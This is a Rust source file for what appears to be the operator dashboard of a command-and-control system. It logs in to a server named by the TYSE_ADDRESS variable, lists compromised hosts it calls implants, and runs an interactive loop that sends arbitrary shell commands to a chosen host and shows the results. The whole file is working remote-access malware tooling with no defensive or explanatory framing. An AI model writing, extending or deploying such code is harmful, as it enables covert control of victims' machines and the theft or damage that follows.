use std::{
    env,
    io::{Write, stdin, stdout},
    net::TcpStream,
};

use common::{Implant, Packet, encode, read_packet};

fn main() -> Result<(), Box<dyn std::error::Error>> {
    let passwd = rpassword::prompt_password("Input password: ")?;

    let mut connection = connect();
    connection.write(
        encode(Packet::DashboardLogin { password: passwd })
            .unwrap()
            .as_slice(),
    )?;

    let packet = read_packet(&mut connection).unwrap();

    match packet {
        Packet::LoginSuccess => {
            println!("Login successful!");
        }
        Packet::LoginFailed => {
            println!("Login failed.");
            return Ok(());
        }
        _ => {
            println!("Unexpected packet received");
            return Ok(());
        }
    }

    loop {
        let mut connection = connect();

        connection.write(
            encode(common::Packet::ImplantListRequest)
                .unwrap()
                .as_slice(),
        )?;

        let packet = read_packet(&mut connection).unwrap();
        let mut implants = Vec::new();

        match packet {
            Packet::ImplantList(implant_list) => {
                implants = implant_list;
            }
            _ => {}
        }

        println!("Available implants: ");
        for (i, implant) in implants.iter().enumerate() {
            println!(
                "[{}]: {} ({})",
                i + 1,
                implant.system_info.hostname,
                implant.system_info.name
            );
        }

        println!("");
        print!("> ");
        stdout().flush().unwrap();
        let mut input = String::new();
        stdin().read_line(&mut input).unwrap();
        let input = input.trim();

        if input == "exit" {
            break;
        }

        if let Ok(index) = input.parse::<usize>()
            && let Some(implant) = implants.get(index - 1)
        {
            enter_command_loop(index - 1, implant);
        }
    }

    Ok(())
}

fn connect() -> TcpStream {
    let address = env::var_os("TYSE_ADDRESS").unwrap();
    TcpStream::connect(address.into_string().unwrap()).unwrap()
}

fn enter_command_loop(implant_id: usize, implant: &Implant) {
    let mut last_exit_code = None;
    let mut last_output = None;
    loop {
        if let Some(output) = last_output {
            println!("{}", output);
        }

        print!(
            "{}{}> ",
            implant.system_info.hostname,
            if let Some(exit_code) = last_exit_code {
                format!(": {exit_code}")
            } else {
                "".to_string()
            }
        );
        stdout().flush().unwrap();
        last_output = None;
        last_exit_code = None;

        let mut input = String::new();
        stdin().read_line(&mut input).unwrap();
        let input = input.trim();

        if input == "exit" {
            return;
        }

        let mut connection = connect();
        connection
            .write(
                encode(Packet::CommandPacket {
                    implant_id,
                    command: input.to_string(),
                })
                .unwrap()
                .as_slice(),
            )
            .unwrap();

        let packet = read_packet(&mut connection).unwrap();

        match packet {
            Packet::CommandResult { exit_code, output } => {
                last_exit_code = Some(exit_code);
                last_output = Some(output);
            }
            _ => {}
        }
    }
}
